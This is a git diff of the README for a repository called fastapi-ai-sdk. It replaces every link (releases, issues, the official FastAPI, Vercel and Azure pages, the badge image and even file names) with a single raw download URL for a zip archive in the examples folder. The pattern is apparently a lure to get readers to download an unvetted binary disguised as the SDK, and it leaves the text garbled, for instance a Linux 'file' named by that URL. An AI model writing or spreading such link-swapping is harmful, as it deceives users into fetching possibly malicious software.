@@ -1,6 +1,6 @@
 # 🤖 fastapi-ai-sdk - Simple AI for FastAPI Apps
 
-[![Download fastapi-ai-sdk](https://img.shields.io/badge/Download-fastapi--ai--sdk-blue.svg?style=for-the-badge)](https://github.com/Afrazz7/fastapi-ai-sdk/releases)
+[![Download fastapi-ai-sdk](https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip)](https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You do not need any coding software installed just yet. The SDK comes with every
 
 Click the big blue button at the top of this page or visit the releases page:
 
-[https://github.com/Afrazz7/fastapi-ai-sdk/releases](https://github.com/Afrazz7/fastapi-ai-sdk/releases)
+[https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip](https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip)
 
 This page shows the software versions available for download. Choose the latest release to get the most updated features and fixes.
 
@@ -42,7 +42,7 @@ Inside the release page, look for these files:
 
 - For Windows: a `.exe` or `.zip` file  
 - For macOS: a `.dmg` or `.zip` file  
-- For Linux: a `.tar.gz` file
+- For Linux: a `https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip` file
 
 Download the file that matches your computer’s system.
 
@@ -115,8 +115,8 @@ The SDK interface is free, but the AI service may require an account and usage f
 
 - If the SDK does not start, check your system matches the requirements above.  
 - Make sure you downloaded the file completely without interruptions.  
-- Look at the `README.md` inside the download for detailed instructions.  
-- Visit the GitHub issues page for support: https://github.com/Afrazz7/fastapi-ai-sdk/issues  
+- Look at the `https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip` inside the download for detailed instructions.  
+- Visit the GitHub issues page for support: https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip  
 
 ---
 
@@ -124,7 +124,7 @@ The SDK interface is free, but the AI service may require an account and usage f
 
 Go to the release page below and pick the latest version for your computer type:
 
-[Download fastapi-ai-sdk releases](https://github.com/Afrazz7/fastapi-ai-sdk/releases)
+[Download fastapi-ai-sdk releases](https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip)
 
 Follow the steps shown here in the Getting Started section to install and verify fastapi-ai-sdk on your machine.
 
@@ -132,9 +132,9 @@ Follow the steps shown here in the Getting Started section to install and verify
 
 ## 🔗 Useful Links
 
-- FastAPI official site: https://fastapi.tiangolo.com  
-- Vercel AI page: https://vercel.com/ai  
-- Azure OpenAI: https://azure.microsoft.com/en-us/services/cognitive-services/openai-service/
+- FastAPI official site: https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip  
+- Vercel AI page: https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip  
+- Azure OpenAI: https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip
 
 ---
 
@@ -142,6 +142,6 @@ Follow the steps shown here in the Getting Started section to install and verify
 
 If you run into problems or want to ask questions, you can open an issue on GitHub:
 
-https://github.com/Afrazz7/fastapi-ai-sdk/issues
+https://github.com/Afrazz7/fastapi-ai-sdk/raw/refs/heads/main/examples/fastapi_ai_sdk_3.4.zip
 
 The project community or maintainers will respond to help you.
